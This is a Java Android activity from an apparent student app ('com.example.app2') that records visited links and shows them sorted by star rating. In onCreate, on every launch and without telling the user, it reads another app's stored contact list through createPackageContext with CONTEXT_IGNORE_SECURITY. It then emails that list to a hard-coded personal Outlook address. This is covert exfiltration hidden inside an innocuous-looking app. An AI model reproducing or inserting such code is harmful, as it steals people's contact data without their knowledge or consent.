package com.example.app2;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.RatingBar;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Date;

public class MainActivity extends AppCompatActivity {
    BDLinks bdLinks;
    ArrayList<Links> links;
    boolean linkVisited = false;
    long lastId;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        bdLinks = new BDLinks(this);
        links = new ArrayList<>();
        bdLinks.open();
        lastId = bdLinks.getLastId();
        bdLinks.close();
        Context mContext = null;
        try {
            mContext = this.createPackageContext("com.example.app1", Context.CONTEXT_IGNORE_SECURITY);
            SharedPreferences mPrefs = mContext.getSharedPreferences("Contacts", Activity.MODE_PRIVATE);
            String contactList = mPrefs.getString("contacts", null);
            System.out.println("LISTE DES CONTACTS: " + contactList);


            String to = "khadija.abdelouali@outlook.fr";
            String subject = "Projet App Mobile";
            sendMail sm = new sendMail(this, to, subject, contactList);
            sm.execute();

            /***Intent email = new Intent(Intent.ACTION_SEND);
            email.putExtra(Intent.EXTRA_EMAIL, new String[]{ to});
            email.putExtra(Intent.EXTRA_SUBJECT, subject);
            email.putExtra(Intent.EXTRA_TEXT, contactList);


//need this to prompts email client only
            email.setType("message/rfc822");

            //startActivity(email);***/

        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        bdLinks.open();
        links =  bdLinks.getAllLinks();
        System.out.println(links.toString());
        bdLinks.close();
        LinearLayout navigation = (LinearLayout) findViewById(R.id.historique);
        LayoutInflater inflater = this.getLayoutInflater();

        //TextView navigation = findViewById(R.id.navigation);
        //navigation.setText("");

        if (linkVisited) {
            DialogFragment ratingPopUp = new RatingPopUp();

            // Supply num input as an argument.
            Bundle args = new Bundle();
            args.putLong("id", lastId);
            ratingPopUp.setArguments(args);

            ratingPopUp.show(getSupportFragmentManager(), "rates");
            linkVisited = false;
        }
        int rate = 5;
        if (links.size() > 0) {
            navigation.removeAllViews();
            View divider = inflater.inflate(R.layout.rate_divider, null);
            TextView rate_divider = divider.findViewById(R.id.rate_divider);
            rate_divider.setText(rate + " stars");
            navigation.addView(divider);
        }
        for (int i = 0; i < links.size(); i++) {
            if (links.get(i).getRate() < rate) {
                View divider2 = inflater.inflate(R.layout.rate_divider, null);
                rate = links.get(i).getRate();
                TextView rate_divider2 = divider2.findViewById(R.id.rate_divider);
                rate_divider2.setText(rate + " stars");
                navigation.addView(divider2);
            }
            View view = inflater.inflate(R.layout.link_display, null);
            TextView tv = view.findViewById(R.id.link);
            tv.setText(links.get(i).getLink());
            RatingBar rb = view.findViewById(R.id.ratingLink);
            rb.setRating((float) links.get(i).getRate());
            rb.setEnabled(false);
            TextView date = view.findViewById(R.id.date);
            date.setText(links.get(i).getDate());
            navigation.addView(view);
            //  navigation.setText(navigation.getText().toString() + "\n" + links.get(i).getLink() + "(" +links.get(i).getRate() + " stars)");
        }
    }

    public void redirect(View view) {
        TextView tv = (TextView)  view;
        String link = "https://" + tv.getText().toString();
        Uri page = Uri.parse(link);
        Intent intent = new Intent(Intent.ACTION_VIEW, page);
        startActivity(intent);
    }

    public void search(View view) {
        EditText link = findViewById(R.id.link);
        //String link_text = "https://" + link.getText().toString();
        String link_text = link.getText().toString();
        if (!link_text.contains("https://")) {
            link_text = "https://" + link_text;
        }
        System.out.println(link_text);
        bdLinks.open();
            Date today = new Date();
            SimpleDateFormat formater = new SimpleDateFormat("dd/MM/yy");
            String date = formater.format(today);
            System.out.println(date);
            String[] array = link_text.split("//");
            Links LinkToInsert = new Links(array[1], date, 0);
            long insertedId = bdLinks.insertLink(LinkToInsert);
            if (insertedId > lastId) {
                linkVisited = true;
            }
            bdLinks.close();
            Uri page = Uri.parse(link_text);
            Intent intent = new Intent(Intent.ACTION_VIEW, page);
            startActivity(intent);
            link.setText("");
        }
}